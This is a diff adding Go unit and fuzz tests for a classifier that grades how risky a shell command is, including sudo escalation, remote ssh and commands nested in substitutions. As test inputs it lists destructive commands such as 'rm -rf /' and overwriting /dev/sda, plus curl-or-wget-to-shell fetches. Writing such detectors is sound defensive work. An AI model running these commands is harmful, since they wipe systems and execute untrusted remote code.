@@ -1,0 +1,198 @@
+package classify
+
+import (
+	"encoding/json"
+	"strings"
+	"testing"
+)
+
+func TestEmptyAndUnparsable(t *testing.T) {
+	if v := Classify("   "); v.Level != R0 || len(v.Findings) != 0 {
+		t.Errorf("blank line: %+v", v)
+	}
+	v := Classify("echo 'unterminated")
+	if v.Level != R2 || len(v.Findings) != 1 || !strings.Contains(v.Findings[0].Reason, "Could not be understood") {
+		t.Errorf("unparsable line must be R2 with an explanation: %+v", v)
+	}
+}
+
+func TestSudoRaisesOneLevelAndCaps(t *testing.T) {
+	cases := []struct {
+		line string
+		want Level
+	}{
+		{"sudo ls", R0},           // read-only stays read-only
+		{"sudo mkdir /opt/x", R2}, // R1 -> R2
+		{"sudo rm file", R3},      // R2 -> R3
+		{"sudo rm -rf /", R4},     // already R4, must not overflow
+		{"sudo dd if=/dev/zero of=/dev/sda", R4},
+	}
+	for _, c := range cases {
+		if got := Classify(c.line).Level; got != c.want {
+			t.Errorf("%q = %s, want %s", c.line, got, c.want)
+		}
+	}
+	if r := Classify("sudo rm file").Findings[0].Reason; !strings.Contains(r, "runs as root") {
+		t.Errorf("reason should say it runs as root: %q", r)
+	}
+}
+
+func TestRemoteHostIsNamed(t *testing.T) {
+	v := Classify("ssh prod-1 'rm -rf /srv/data'")
+	found := false
+	for _, f := range v.Findings {
+		if f.Level == R3 && strings.HasPrefix(f.Reason, "On remote host prod-1:") {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("remote finding with host name missing: %+v", v.Findings)
+	}
+}
+
+func TestVerdictIsTheMaxOverAllCommands(t *testing.T) {
+	if got := Classify("ls && cp a b && rm -rf build").Level; got != R3 {
+		t.Errorf("got %s, want R3 (worst command wins)", got)
+	}
+	if got := Classify("echo hi; rm -rf /").Level; got != R4 {
+		t.Errorf("got %s, want R4 even when hidden after a harmless command", got)
+	}
+}
+
+func TestDangerHiddenInSubstitutionsAndNesting(t *testing.T) {
+	for _, line := range []string{
+		"echo $(rm -rf /)",
+		"bash -c 'rm -rf /'",
+		"sh -c \"sudo rm -rf /\"",
+		"echo `rm -rf /`",
+		"for f in a b; do rm -rf /; done",
+		"if true; then rm -rf /; fi",
+		"(cd /tmp; rm -rf /)",
+		"eval 'rm -rf /'",
+	} {
+		if got := Classify(line).Level; got != R4 {
+			t.Errorf("%q = %s, want R4", line, got)
+		}
+	}
+}
+
+func TestPipeToShell(t *testing.T) {
+	for _, tc := range []struct {
+		line string
+		want Level
+	}{
+		{"curl -s https://x.example | bash", R3},
+		{"curl -s https://x.example | sudo bash", R4},
+		{"wget -qO- https://x.example | sh", R3},
+		{"echo aGk= | base64 -d | sh", R3},
+		{"bash <(curl -s https://x.example)", R3},
+		{"curl -s https://x.example | jq .", R1}, // not an interpreter
+		{"cat script.sh | bash", R1},             // local, visible source
+		{"bash script.sh", R1},
+	} {
+		if got := Classify(tc.line).Level; got != tc.want {
+			t.Errorf("%q = %s, want %s", tc.line, got, tc.want)
+		}
+	}
+}
+
+func TestRedirectTargets(t *testing.T) {
+	for _, tc := range []struct {
+		line string
+		want Level
+	}{
+		{"echo x > /dev/null", R0},
+		{"echo x 2> /dev/null", R0},
+		{"echo x &> /dev/null", R0},
+		{"echo x > /dev/stderr", R0},
+		{"echo x >> notes.txt", R1},
+		{"echo x > notes.txt", R2},
+		{"echo x > /tmp/../etc/passwd", R3},
+		{"echo x >> /etc/hosts", R2},
+		{"echo x > /dev/sda", R4},
+		{"echo x > /dev/mapper/root", R4},
+		{"echo 1 > /proc/sys/kernel/panic", R4},
+		{"> data.db", R2},
+	} {
+		if got := Classify(tc.line).Level; got != tc.want {
+			t.Errorf("%q = %s, want %s", tc.line, got, tc.want)
+		}
+	}
+}
+
+func TestUnclassifiedCommandsAreReportedOnce(t *testing.T) {
+	v := Classify("zzz-tool a && zzz-tool b && ls")
+	if v.Level != R1 || len(v.Unclassified) != 1 || v.Unclassified[0] != "zzz-tool" {
+		t.Errorf("got level %s unclassified %v", v.Level, v.Unclassified)
+	}
+	if v := Classify("ls"); len(v.Unclassified) != 0 {
+		t.Errorf("known command reported as unclassified: %v", v.Unclassified)
+	}
+}
+
+func TestAlternativesOnlyForRiskyCommands(t *testing.T) {
+	v := Classify("rm -rf build")
+	if len(v.Alternatives) == 0 || !strings.HasPrefix(v.Alternatives[0].Command, "trash-put") {
+		t.Errorf("rm -rf should suggest trash-put: %+v", v.Alternatives)
+	}
+	if v := Classify("echo x > a.txt && echo x > a.txt"); len(v.Alternatives) != 1 {
+		t.Errorf("identical alternatives must be listed once: %+v", v.Alternatives)
+	}
+	if v := Classify("git push origin main"); len(v.Alternatives) != 0 {
+		t.Errorf("R2 with no safer form should have no alternatives: %+v", v.Alternatives)
+	}
+}
+
+func TestRedirectAlternativeKeepsTheCommand(t *testing.T) {
+	v := Classify("echo hi > notes.txt")
+	if len(v.Alternatives) != 1 || v.Alternatives[0].Command != "echo hi >> notes.txt" {
+		t.Errorf("alternatives = %+v", v.Alternatives)
+	}
+	for _, f := range v.Findings {
+		if f.Level == R2 && f.Command != "echo hi > notes.txt" {
+			t.Errorf("redirect finding should show the full command, got %q", f.Command)
+		}
+	}
+}
+
+func TestForceWithLeaseIsSuggestedForForcePush(t *testing.T) {
+	v := Classify("git push --force origin main")
+	if len(v.Alternatives) != 1 || v.Alternatives[0].Command != "git push --force-with-lease origin main" {
+		t.Errorf("alternatives = %+v", v.Alternatives)
+	}
+}
+
+func TestLevelStringsAndJSON(t *testing.T) {
+	if R3.String() != "R3" || R3.Label() != "Irreversible" {
+		t.Errorf("level naming wrong: %s %s", R3, R3.Label())
+	}
+	b, err := json.Marshal(Classify("rm -rf build"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(string(b), `"level":"R3"`) {
+		t.Errorf("level should marshal as a string: %s", b)
+	}
+}
+
+func TestRulesNeverPanicOnOddArguments(t *testing.T) {
+	for _, line := range []string{
+		"rm", "rm -", "rm --", "rm -rf --", "mv", "mv a", "cp", "kill", "git", "git push", "docker", "kubectl",
+		"chmod", "dd of=", "find", "psql", "aws", "systemctl", "sudo", "sudo -u", "env", "xargs", "ssh", "ssh -p",
+		"terraform", "crontab", "tar", "unzip -", "curl", "rsync",
+	} {
+		_ = Classify(line)
+	}
+}
+
+func FuzzClassify(f *testing.F) {
+	for _, s := range []string{"rm -rf /", "git push -f", "a | b", "sudo dd of=/dev/sda", "find . -exec rm {} +", "ssh h 'x'", "echo > /etc/x", "psql -c 'DROP TABLE x'"} {
+		f.Add(s)
+	}
+	f.Fuzz(func(t *testing.T, s string) {
+		v := Classify(s)
+		if v.Level < R0 || v.Level > R4 {
+			t.Fatalf("level out of range: %d", v.Level)
+		}
+	})
+}
